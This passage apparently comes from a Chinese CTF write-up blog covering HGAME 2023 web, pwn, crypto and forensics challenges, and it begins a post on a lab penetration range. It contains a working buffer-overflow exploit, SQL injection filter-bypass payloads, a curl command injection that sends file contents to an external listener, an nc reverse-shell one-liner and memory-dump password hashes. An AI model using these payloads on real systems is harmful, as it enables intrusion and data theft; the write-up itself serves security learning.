s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> s1:<span class="comment"># åˆ¤æ–­æ˜¯å¦æœ‰ç©ºå€¼åœ¨åˆ—è¡¨ä¸­</span></span><br><span class="line">    s1.remove(<span class="string">&quot;&quot;</span>)<span class="comment"># å¦‚æœæœ‰å°±ç›´æ¥é€šè¿‡removeåˆ é™¤</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        key = s1[i][<span class="number">0</span>:<span class="built_in">int</span>(<span class="built_in">len</span>(s1[i])/<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># print(key)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = s1[i]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        d[key]=value</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#é”®å’Œå€¼äº’æ¢</span></span><br><span class="line">d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(d.values(), d.keys()))</span><br><span class="line"><span class="comment">#21:mingzi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = <span class="string">&quot;session=MTY3MzA3MjkwM3xEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUI0R2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfKAl_lYBbx-VHq4BBl3686G2F3ThoYf7RvWQiatnCUqN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getQuestion&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: session,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    text = requests.get(url,headers=headers)</span><br><span class="line">    ans = <span class="built_in">eval</span>(text.text)</span><br><span class="line">    <span class="comment">#&#123;&#x27;message&#x27;: &#x27;20çº§ / WEB / èœçš„æŠ è„š / æƒ³å­¦GO&#x27;&#125;</span></span><br><span class="line">    answord = <span class="built_in">str</span>(ans[<span class="string">&#x27;message&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(answord)</span><br><span class="line">    <span class="keyword">if</span> answord <span class="keyword">in</span> d.keys():</span><br><span class="line">        <span class="built_in">print</span>(d[answord])</span><br><span class="line">        daan = d[answord]</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: daan,</span><br><span class="line">    &#125;</span><br><span class="line">        url_verifyAnswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/verifyAnswer&quot;</span></span><br><span class="line">        text_verifyAnswer = requests.post(url = url_verifyAnswer,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.text)</span></span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        url_Score = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getScore&quot;</span></span><br><span class="line">        text_Score = requests.get(url = url_Score,data=data,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(text_Score.text)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        sesson = re.findall(<span class="string">&quot;(.*?); Path=/&quot;</span>,text_verifyAnswer.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        session = sesson[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h4 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h4><p>ç®€å•æ–‡ä»¶ä¸Šä¼ ï¼Œé»‘åå•çš„php fuzzä¸€ä¸‹ï¼Œå¤§å°å†™ç»•è¿‡å°±å¯ä»¥äº†ï¼Œä¸Šä¼ shellä¹‹åï¼Œèšå‰‘ï¼Œflagåœ¨è·Ÿä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107160532176.png" alt="image-20230107160532176"></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>ç®€å•rsa n,e,d,éƒ½ç»™äº†ï¼Œä½¿ç”¨å¤§ä½¬çš„å·¥å…·æ‰€å°±è¡Œäº†</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107161606240.png" alt="image-20230107161606240"></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h4><p>nc ip port å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p><h4 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h4><p>è¿™ä¸ªç®€å•æº¢å‡ºé¢˜æ²¡è§è¿‡ï¼Œè®°å½•ä¸€ä¸‹<br>ç‚¹å‡»mainå‡½æ•°ï¼Œç„¶åF5æŸ¥çœ‹ä¼ªæºç ,å¯ä»¥çœ‹åˆ°bufå¤„å­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯æœ‰ä¸ªclose(1)ï¼Œ<br>closeï¼ˆ1ï¼‰å…³é—­äº†æ ‡å‡†è¾“å‡º<br>å‚è€ƒ<code>https://blog.csdn.net/xirenwang/article/details/104139866</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ˆ 10+8 backdoor 401176</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170004991.png" alt="image-20230207170004991"></p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170036399.png" alt="image-20230207170036399"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="string">&quot;32588&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#or</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;ls 1&gt;&amp;0&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag 1&gt;&amp;0&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170801337.png" alt="image-20230207170801337"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist]</span><br><span class="line">â””â”€<span class="comment"># cd week-2.hgame.lwsec.cn_31248</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">â””â”€<span class="comment"># ls</span></span><br><span class="line">Th1s_1s-flag</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">â””â”€<span class="comment"># cat Th1s_1s-flag</span></span><br><span class="line">hgame&#123;Don<span class="string">&#x27;t^put*Git-in_web_directory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h4><p><a href="https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97">https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97</a></p><h4 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h4><p>å¼±å£ä»¤ï¼Œçˆ†ç ´ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230213151310768.png" alt="image-20230213151310768"></p><p>user01<br>admin123</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">search_id=1  æ˜¾ç„¶æ³¨å…¥äº†</span><br><span class="line">search_id=1/**/order/**/by/**/1    //Error Occurred  ç©ºæ ¼è¢«è¿‡æ»¤ /**/</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred  /**/ è¢«è¿‡æ»¤ ç”¨/*123*/ æ›¿æ¢</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred</span><br><span class="line">//è¿™é‡Œè¯­å¥æ²¡æœ‰é—®é¢˜ï¼ŒçŒœæµ‹æ˜¯orè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬åœ¨åŠ ä¸€ä¸ªor</span><br><span class="line">search_id=1/*123*/oorrder/*123*/by/*123*/1    //hard disk1</span><br><span class="line">//è¿™é‡Œoorrder æˆåŠŸï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹åå°æ˜¯å§oræ›¿æ¢ä¸ºç©ºäº†,</span><br><span class="line">æ³¨å‡º3ä¸ªå­—æ®µ</span><br><span class="line">search_id=-1/*1123*/union/*1123*/select/*2123*/2,3,4     //Error Occurred</span><br><span class="line">è¿™é‡ŒçŒœæµ‹æ˜¯union select æ›¿æ¢äº†ï¼Œå› ä¸ºä¸Šé¢ä¹Ÿoræ›¿æ¢äº†</span><br><span class="line">search_id=-1/*1123*/ununionion/*1123*/selselectect/*2123*/2,3,4</span><br><span class="line">or  å¤§å°å†™</span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,3,database() //Error Occurred</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Database(),4 //database  åŒå†™orå¤§å†™ //se4rch   4</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Group_concat(table_name)/*2123*/frOm/*2123*/infoorrmation_schema.tables/*2123*/whEre/*2123*/table_schema/*2123*/like/*2123*/&#x27;se4rch&#x27;</span><br><span class="line"></span><br><span class="line">è·å–è¡¨å</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,datadatabasebase(),4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h4><p>ping to host<br>æ— å›æ˜¾</p><p>vpsç›‘å¬ <code>nc -lkvvnp 7777</code></p><p>æœ‰è¿‡æ»¤  å¦‚æœä¸åŠ base64   ä¼šä¸æ˜¾ç¤º</p><p>ip=127.0.0.1%26%26curl%09<a href="http://182.92.176.62:7777/%60nl%09/f*|base64%60">http://182.92.176.62:7777/`nl%09/f*|base64`</a>  </p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230201105313163.png" alt="image-20230201105313163"></p><p>/ICAgICAxCWhnYW1le3AxbkdfdDBfQ29tTTRuRF9FeGVjVXQxb25fZEFuZ0VyUnJSclJyUiF9Cg==</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h4><p>bind xxe</p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ezwin"><a href="#ezwin" class="headerlink" title="ezwin"></a>ezwin</h4><p>è¿™ä¸ªé¢˜æ¯”è¾ƒæœ‰æ„æ€äº†ï¼Œè¿™é‡ŒVolatility 3 å’ŒVolatility 2æœ‰æˆªç„¶ä¸åŒçš„ç»“æœï¼Œä¸æ˜¯å¾ˆç†è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.envars.Envars | grep hgame</span><br><span class="line">3492resssihost.exe      0x222e2561bc0canHGAME_FLAGhed   hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3520    svchost.exe     0x1d2f6e033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3528    svchost.exe     0x163d90033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3668    taskhostw.exe   0x1ced6651bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3828    ctfmon.exe      0x1e2d9081bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3992    explorer.exe    0x1151bf0       HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 envars | grep hgame</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">    3492 sihost.exe           0x00000222e2560fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3520 svchost.exe          0x000001d2f6e027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3528 svchost.exe          0x00000163d90027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3668 taskhostw.exe        0x000001ced6650fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3828 ctfmon.exe           0x000001e2d9080fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3992 explorer.exe         0x0000000006607a60 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bohemian)-[/tools/volatility3]</span><br><span class="line">â””â”€<span class="comment"># python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.hashdump</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">User    rid     lmhash  nthash</span><br><span class="line"></span><br><span class="line">Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        c4b2cf9cac4752fc9b030b8ebc6faac3</span><br><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Administrator:500:6a21484f766d3766175c3a3f7763e688:b08b01ca485aea836bacb3aad6c45b26:::</span><br><span class="line">Guest:501:6a0af1d516e75dd696266273ce666e21:82e20e246547aa3ae431aec52f53cdf5:::</span><br><span class="line">DefaultAccount:503:ce2bccae5ac352b8e38c1d3194475940:4a947667f1ab4136246644fa344650b3:::</span><br><span class="line">WDAGUtilityAccount:504:efa88db8c9ac1b9f5798999b03241b90:611c4a5c71e01e167d8ef049135ff150:::</span><br><span class="line">Noname:1000:f4272abfe4b751256f7b4a0932246690:3454cf62689ec53e97581f7a3312c3a9:::</span><br></pre></td></tr></table></figure><p>volatility 2 filescan æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªflag.7z é¢˜ç›®æç¤ºä¹Ÿç»™äº†ï¼Œè¿™é‡Œdumpfilesæ—¶ -q æå–ä¸æ¥ä¸œè¥¿ï¼Œ</p><p>ä½†æ˜¯å¯ä»¥-pid æ‰¾åˆ°å‹ç¼©æ–‡ä»¶çš„è¿›ç¨‹å·ï¼Œè¿™æ ·ä¼šæå–å‡ºæ¥ä¸€ä¸‹æ— å…³çš„æ–‡ä»¶ï¼Œå†™ä¸ªç®€å•è„šæœ¬ çœ‹çœ‹é‚£ä¸ªæ˜¯zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        file <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216150417789.png" alt="image-20230216150417789"></p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ª7-zipæ–‡ä»¶ï¼Œæ‹–åˆ°winä¸‹  ç„¶åè§£ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216151102965.png" alt="image-20230216151102965"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª6270çš„datæ–‡ä»¶å¯ä»¥è§£å‹å‡ºæ¥ä¸œè¥¿ï¼Œä½†æ˜¯å‘¢ï¼Œè¿™ä¸ªtxtè¢«wannarenåŠ å¯†äº†ï¼Œç»è¿‡æœç´¢ï¼Œç«ç»’æœ‰ä¸€ä¸ªå¯ä»¥è§£å¯†çš„è½¯ä»¶</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216152439725.png" alt="image-20230216152439725"></p><p>æ–°ä½›æ›°ï¼Œè§£å‡ºæ¥æäº¤å‘ç°ä¸å¯¹ï¼Œé—®äº†ä¸€ä¸‹å‡ºé¢˜äººï¼Œå‘ç°ä¸å¯¹ï¼Œè¯´è¦ç”¨volatility 3ï¼Œé¢˜ç›®å…¶å®ä¹Ÿæç¤ºäº†è¦ç”¨ä¸‰ï¼Œå½“æ—¶æœºå™¨æ²¡æœ‰ä¸‰ï¼Œæˆ‘å°±ç”¨ä¸‰é‡æ–°åšä¸€éï¼Œä¸€æ ·çš„æ­¥éª¤ï¼Œæå‡ºæ¥çš„å°±ä¸è¦ä¸€æ ·ã€‚åæ¥æˆ‘å»æœäº†è¿™ä¸ªæ–°ä½›æ›°çš„ç ï¼Œå‘ç°æ˜¯2022å¹´çš„é¢˜ã€‚åŒä¸€ä¸ªç¯å¢ƒä½†æ˜¯æå‡ºæ¥çš„å‹ç¼©åŒ…ä¸ä¸€æ ·ï¼Œä¸å¤ªæ¸…æ¥šã€‚</p><p>ç”¨volatility 3ä»æ–°åšä¸€ä¸‹ï¼Œ</p><p>python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.dumpfiles â€“pid 7584</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æçš„ï¼Œè¿™æ ·ä¼šæå‡ºæ¥ä¸€å¤§å †æ–‡ä»¶ï¼ŒåŒæ ·ç”¨è„šæœ¬åˆ¤æ–­ä¸€ä¸‹é‚£ä¸ªzip,è¿™ä¸ªæ ¹æ®åå­—ä¹Ÿèƒ½å¤§æ¦‚çŒœå‡º</p><p>file.0xd00641b5ba70.0xd00641180e30.DataSectionObject.flag.7z.dat</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216153755607.png" alt="image-20230216153755607"></p><p>æ‰“å¼€å¯ä»¥çœ‹åˆ°å¯†ç æ˜¯è§£å‡ºæ¥hash</p><p>84b0d9c9f830238933e7131d60ac6436</p><p>æŸ¥è¯¢ç»“æœï¼š asdqwe123</p><p>å°±å¯ä»¥äº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¼±å£ä»¤å®‰å…¨å®éªŒå®¤æ‹›æ–°èµ›-é¶æœºæŒ‘æˆ˜</title>
      <link href="/2023/01/05/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/"/>
      <url>/2023/01/05/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144545334.png" alt="image-20230105144545334"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144556972.png" alt="image-20230105144556972"></p><p><a href="https://www.iculture.cc/rce/">https://www.iculture.cc/rce/</a></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.144.128 9990 &gt;/tmp/f</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105145002174.png" alt="image-20230105145002174"></p><p>setg Proxies socks5:192.168.144.128:1080 #è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚</p><p>setg Proxies socks5:192.168.144.136:8888 #è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚</p><p>:&gt;fscan.exe -h 192.168.48.1/24<br>fscan.exe -h 192.168.48.1/24</p><hr><p>  / _ \     ___  ___ _ __ __ _  <em><strong>| | __<br> / /<em>/</em></strong></em>/ __|/ <strong>| â€˜</strong>/ <em>` |/ <strong>| |/ /<br>/ /<em>\_</em></strong></em>__ \ (<strong>| | | (_| | (</strong>|   &lt;<br>____/     |___/___|_|  __,_|___|_|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target 